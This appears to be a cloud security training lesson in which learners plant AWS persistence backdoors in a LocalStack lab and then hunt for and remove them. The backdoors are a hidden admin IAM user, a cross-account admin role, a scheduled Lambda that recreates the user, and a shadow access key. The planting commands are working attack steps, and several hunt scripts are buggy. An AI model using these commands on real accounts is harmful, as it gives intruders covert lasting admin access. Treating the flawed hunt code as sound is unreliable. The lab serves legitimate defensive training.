---
title: "Cloud Practice — Persistence Detection and Hunting"
tags: [cloud-practice, detection, threat-hunting, CloudTrail, backdoor,
       IAM-audit, cross-account-role, Lambda-beacon, shadow-key,
       incident-response, blue-team]
module: 04-BroadSurface-02
day: 203
related_topics:
  - Cloud Persistence Techniques (Day 191)
  - Detecting Cloud Attacks (Day 194)
  - Cloud Security Review (Day 196)
  - Cloud Full Attack Lab (Day 192)
---

# Day 203 — Cloud Practice: Persistence Detection and Hunting

> "The hardest part of cloud IR is not finding the breach — it is finding
> everything the attacker left behind. Credential rotation does not remove a
> backdoor IAM user. Password changes do not remove a cross-account role.
> Rebooting the EC2 instance does not remove the Lambda beacon. Today you plant
> every persistence artefact from Day 191 in a lab environment, then you put on
> the blue hat and hunt them down. That is how you build the detection logic you
> actually need."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Plant all four cloud persistence artefacts in a LocalStack environment.
2. Hunt for each artefact using CloudTrail analysis and IAM enumeration.
3. Write detection queries that surface each artefact class.
4. Build an IR checklist that would catch every artefact if run during
   incident response.
5. Remove each artefact completely and verify removal.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud Persistence Techniques | Day 191 |
| Detecting Cloud Attacks | Day 194 |
| Cloud Full Attack Lab | Day 192 |
| LocalStack + awslocal | `pip install localstack awscli-local` |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/persistence-detection-lab/
docker compose up -d

export AWS_ENDPOINT_URL="http://localhost:4566"
export AWS_DEFAULT_REGION="us-east-1"

# Verify admin access (attacker credentials)
source attacker.env
aws sts get-caller-identity
```

---

## Phase 1 — Red Team: Plant All Persistence Artefacts (45 min)

Plant each artefact from Day 191. Document every API call as you make it —
you will need to find them in CloudTrail next.

### Artefact 1: Backdoor IAM User

```bash
# Create a stealthy backdoor user
BACKDOOR_USER="svc-health-monitor"   # Looks like a legitimate service account

aws iam create-user --user-name $BACKDOOR_USER \
  --tags Key=CreatedBy,Value=CloudOpsAutomation

aws iam attach-user-policy \
  --user-name $BACKDOOR_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

BACKDOOR_KEY=$(aws iam create-access-key --user-name $BACKDOOR_USER)
echo "[PLANTED] Backdoor user: $BACKDOOR_USER"
echo $BACKDOOR_KEY | jq '.AccessKey | {KeyId: .AccessKeyId, Secret: .SecretAccessKey}'

# Record the exact time (for CloudTrail hunting later)
echo "Backdoor user created at: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
```

### Artefact 2: Cross-Account Backdoor Role

```bash
cat > /tmp/backdoor-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {"sts:ExternalId": "lab-reentry-xyz789"}
    }
  }]
}
EOF

aws iam create-role \
  --role-name CloudSyncHealthRole \
  --assume-role-policy-document file:///tmp/backdoor-trust.json \
  --description "Cloud synchronization health monitoring"

aws iam attach-role-policy \
  --role-name CloudSyncHealthRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "[PLANTED] Cross-account backdoor role: CloudSyncHealthRole"
echo "[PLANTED] Trusted account: 999999999999, ExternalId: lab-reentry-xyz789"
```

### Artefact 3: Lambda Beacon with Schedule

```bash
mkdir -p /tmp/beacon && cat > /tmp/beacon/index.py << 'EOF'
import boto3, os

def handler(event, context):
    """Maintenance function — do not modify."""
    iam = boto3.client("iam",
      endpoint_url=os.environ.get("AWS_ENDPOINT_URL", ""))
    # Silently recreate the backdoor user if deleted
    try:
        iam.create_user(UserName="svc-health-monitor")
        iam.attach_user_policy(
            UserName="svc-health-monitor",
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
        iam.create_access_key(UserName="svc-health-monitor")
    except Exception:
        pass   # Already exists — normal operation
EOF

cd /tmp/beacon && zip -r ../beacon.zip . && cd -

# Create the beacon Lambda
aws lambda create-function \
  --function-name system-maintenance \
  --runtime python3.11 \
  --role arn:aws:iam::000000000000:role/LambdaExecutionRole \
  --handler index.handler \
  --zip-file fileb:///tmp/beacon.zip \
  --description "System maintenance and health checks"

# Create EventBridge schedule (every 12 hours)
aws events put-rule \
  --name SystemMaintenanceSchedule \
  --schedule-expression "rate(12 hours)" \
  --description "Automated system maintenance" \
  --state ENABLED

aws lambda add-permission \
  --function-name system-maintenance \
  --statement-id EventBridgeInvoke \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:us-east-1:000000000000:rule/SystemMaintenanceSchedule

aws events put-targets \
  --rule SystemMaintenanceSchedule \
  --targets Id=1,Arn=arn:aws:lambda:us-east-1:000000000000:function:system-maintenance

echo "[PLANTED] Lambda beacon: system-maintenance, schedule: every 12 hours"
```

### Artefact 4: Shadow Access Key

```bash
# Add a second access key to an existing legitimate user
EXISTING_USER="developer-alice"

aws iam create-access-key --user-name $EXISTING_USER
echo "[PLANTED] Shadow key added to existing user: $EXISTING_USER"

# Note: a user can have at most 2 access keys
# Defenders often only rotate the active key, missing the shadow key
```

---

## Phase 2 — Blue Team: Hunt for Each Artefact (60 min)

Switch to defender credentials. Do not use the red team notes — hunt from
the evidence.

```bash
source defender.env
aws sts get-caller-identity
```

### Hunt 1: Backdoor IAM Users

```bash
# List all IAM users — look for suspicious names, creation times, tags
aws iam list-users \
  | jq '.Users[] | {
      Name: .UserName,
      Created: .CreateDate,
      Tags: .Tags
    }' \
  | sort_by(.Created) | reverse   # Most recently created first

# For each user, check attached policies
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  policies=$(aws iam list-attached-user-policies \
    --user-name $user \
    --query 'AttachedPolicies[*].PolicyArn' --output text)
  if echo "$policies" | grep -q "AdministratorAccess"; then
    echo "[CRITICAL] $user has AdministratorAccess"
    # Check access keys
    aws iam list-access-keys --user-name $user \
      | jq '.AccessKeyMetadata[] | {Key: .AccessKeyId, Status: .Status, Created: .CreateDate}'
  fi
done

# CloudTrail: Find CreateUser events from the last 24 hours
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser \
  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || \
                 date -u -v-24H +%Y-%m-%dT%H:%M:%SZ) \
  | jq '.Events[] | .CloudTrailEvent | fromjson |
    {
      Time: .eventTime,
      By: .userIdentity.arn,
      User: .requestParameters.userName,
      IP: .sourceIPAddress
    }'
```

### Hunt 2: Cross-Account Backdoor Roles

```bash
# List all IAM roles — look for external trust relationships
aws iam list-roles | jq '.Roles[] |
  {
    Name: .RoleName,
    Created: .CreateDate,
    Trust: .AssumeRolePolicyDocument.Statement[]
  }' | python3 << 'EOF'
import json, sys

data = sys.stdin.read()
# Parse the output looking for external trust
for line in data.split('\n'):
    if '"AWS"' in line and '999999999999' not in ['123456789012', '234567890123']:
        print("[EXTERNAL TRUST]", line)
EOF

# Better: direct query for cross-account roles
aws iam list-roles --query 'Roles[*]' | python3 << 'EOF'
import json, sys, re

KNOWN_ACCOUNTS = {"000000000000", "123456789012"}   # your org accounts

roles = json.load(sys.stdin)
for role in roles:
    trust_doc = role["AssumeRolePolicyDocument"]
    for stmt in trust_doc.get("Statement", []):
        principal = stmt.get("Principal", {})
        aws_principal = principal.get("AWS", "")
        if isinstance(aws_principal, str):
            aws_principal = [aws_principal]
        for p in aws_principal:
            account_match = re.search(r':(\d{12}):', p)
            if account_match:
                account_id = account_match.group(1)
                if account_id not in KNOWN_ACCOUNTS:
                    print(f"[CROSS-ACCOUNT BACKDOOR] Role: {role['RoleName']}")
                    print(f"  Trusted account: {account_id}")
                    print(f"  Full principal: {p}")
                    condition = stmt.get("Condition", {})
                    if condition:
                        print(f"  Condition: {json.dumps(condition)}")
EOF
```

### Hunt 3: Lambda Beacon with Schedule

```bash
# List all Lambda functions — look for suspicious names and descriptions
aws lambda list-functions | jq '.Functions[] | {
  Name: .FunctionName,
  Description: .Description,
  LastModified: .LastModified,
  Role: .Role
}'

# List all EventBridge rules
aws events list-rules | jq '.Rules[] | {
  Name: .Name,
  Schedule: .ScheduleExpression,
  State: .State,
  Description: .Description
}'

# For each scheduled rule, find its target function
for rule in $(aws events list-rules --query 'Rules[*].Name' --output text); do
  targets=$(aws events list-targets-by-rule --rule $rule \
    --query 'Targets[*].Arn' --output text)
  echo "$rule → $targets"
done

# CloudTrail: Find CreateFunction + PutRule correlation
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateFunction \
  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || \
                 date -u -v-24H +%Y-%m-%dT%H:%M:%SZ) \
  | jq '.Events[] | .CloudTrailEvent | fromjson |
    {Time: .eventTime, Function: .requestParameters.functionName,
     By: .userIdentity.arn}'
```

### Hunt 4: Shadow Access Keys

```bash
# List ALL access keys for ALL users — look for users with 2 keys
aws iam list-users --query 'Users[*].UserName' --output text | \
  tr '\t' '\n' | while read user; do
  key_count=$(aws iam list-access-keys --user-name $user \
    --query 'length(AccessKeyMetadata)' --output text)
  if [ "$key_count" -gt 1 ]; then
    echo "[SHADOW KEY] $user has $key_count access keys"
    aws iam list-access-keys --user-name $user \
      | jq '.AccessKeyMetadata[] | {Key: .AccessKeyId, Status: .Status, Created: .CreateDate}'
  fi
done

# CloudTrail: Find CreateAccessKey for users who already had a key
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || \
                 date -u -v-24H +%Y-%m-%dT%H:%M:%SZ) \
  | jq '.Events[] | .CloudTrailEvent | fromjson |
    {
      Time: .eventTime,
      NewKeyFor: .requestParameters.userName,
      By: .userIdentity.arn,
      IP: .sourceIPAddress
    }'
```

---

## Phase 3 — Remediation (30 min)

Remove every persistence artefact completely:

```bash
# 1. Remove backdoor user (revoke access key first)
BACKDOOR_USER="svc-health-monitor"
for key in $(aws iam list-access-keys --user-name $BACKDOOR_USER \
  --query 'AccessKeyMetadata[*].AccessKeyId' --output text); do
  aws iam delete-access-key --user-name $BACKDOOR_USER --access-key-id $key
done
aws iam detach-user-policy \
  --user-name $BACKDOOR_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name $BACKDOOR_USER
echo "Removed: $BACKDOOR_USER"

# 2. Remove cross-account backdoor role
aws iam detach-role-policy \
  --role-name CloudSyncHealthRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-role --role-name CloudSyncHealthRole
echo "Removed: CloudSyncHealthRole"

# 3. Remove Lambda beacon and its schedule
aws events remove-targets --rule SystemMaintenanceSchedule --ids 1
aws events delete-rule --name SystemMaintenanceSchedule
aws lambda delete-function --function-name system-maintenance
echo "Removed: system-maintenance + SystemMaintenanceSchedule"

# 4. Remove shadow key
EXISTING_USER="developer-alice"
# List all keys — find the one you did not create
aws iam list-access-keys --user-name $EXISTING_USER | jq .
# Revoke the shadow key (the one created most recently by the attacker)
aws iam delete-access-key \
  --user-name $EXISTING_USER \
  --access-key-id AKIASHADOWKEYID
echo "Removed shadow key from: $EXISTING_USER"

# 5. Verify clean state
echo "=== Final IAM Audit ==="
aws iam list-users | jq '[.Users[].UserName]'
aws iam list-roles | jq '[.Roles[].RoleName]'
aws lambda list-functions | jq '[.Functions[].FunctionName]'
aws events list-rules | jq '[.Rules[].Name]'
```

---

## IR Checklist — Cloud Persistence Artefact Hunt

```
Step 1: IAM User Audit
  [ ] aws iam list-users → any users created in last 30 days?
  [ ] For each user: attached policies — any admin?
  [ ] For each user: access key count — any with 2 keys?
  [ ] CloudTrail: CreateUser + AttachUserPolicy + CreateAccessKey correlation

Step 2: IAM Role Audit
  [ ] aws iam list-roles → any roles with creation date in last 30 days?
  [ ] For each role: AssumeRolePolicyDocument → any external account in Principal?
  [ ] Any roles with ExternalId condition not in known integrations?

Step 3: Lambda and Schedule Audit
  [ ] aws lambda list-functions → any functions not in IaC/known deployments?
  [ ] aws events list-rules → any scheduled rules?
  [ ] For each rule: list-targets → correlate with Lambda function names
  [ ] CloudTrail: CreateFunction + PutRule + PutTargets in same session

Step 4: Access Key Audit
  [ ] All users: list-access-keys → anyone with 2 keys?
  [ ] Access key last used → any key not used in 30 days (stale backdoor?)
  [ ] Any access keys created outside business hours?

Step 5: CloudTrail Coverage Verification
  [ ] Is CloudTrail enabled in all regions?
  [ ] Is log integrity validation enabled?
  [ ] Are logs centralised to a security S3 bucket?
  [ ] Is the S3 bucket protected by Block Public Access?
```

---

## Key Takeaways

1. **Credential rotation does not remove persistence.** Rotating an EC2 instance
   role does nothing to a backdoor IAM user with its own access key. IR must
   audit all artefact types, not just the initial access vector.
2. **Lambda beacons are self-healing persistence.** If the IR team deletes the
   backdoor user but misses the Lambda + EventBridge schedule, the Lambda will
   recreate the user on its next execution. Audit Lambda and EventBridge before
   declaring a clean state.
3. **Shadow keys on existing users are the hardest to detect.** An extra access
   key on `developer-alice` looks like a second key she might have created
   herself. The detection signal is creation time, creating identity (if it
   was not Alice who created it), and source IP.
4. **Cross-account roles survive complete account remediation.** Even if you
   delete every user, rotate every role, and re-provision the account, a
   cross-account role lets the attacker re-enter from their external account.
   Trust policy audit is mandatory in every IR.
5. **The blue team hunt works best when the red team has documented every API
   call.** Purple team exercises with this structure — red plants, blue hunts,
   compare notes — build detection logic faster than any other method.

---

## Exercises

1. Add a fifth persistence artefact: an IAM policy attached to a group that
   gives `iam:CreateUser` permission to a group the attacker added themselves to.
   Write the hunt query that discovers this.
2. Write a Python script that is a complete cloud IR tool: runs all four artefact
   hunts, outputs a JSON report with severity and evidence for each finding.
3. Research: AWS IAM Access Analyzer — does it detect backdoor IAM users and
   cross-account roles? What does it detect and what does it miss?
4. Write a CloudWatch Events rule that automatically triggers an SNS alert when
   a `CreateUser` event is detected in CloudTrail. What Lambda would you attach
   to do automatic IR response (e.g. immediately disable the new user)?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q203.1, Q203.2 …).
> Follow-up questions use hierarchical numbering (Q203.1.1, Q203.1.2 …).

---

## Navigation

← Previous: [Day 202 — Cloud Practice: GCP](DAY-0202-Cloud-Practice-GCP.md)
→ Next: [Day 204 — Cloud Practice: CloudTrail Evasion and Hunting](DAY-0204-Cloud-Practice-CloudTrail-Evasion.md)
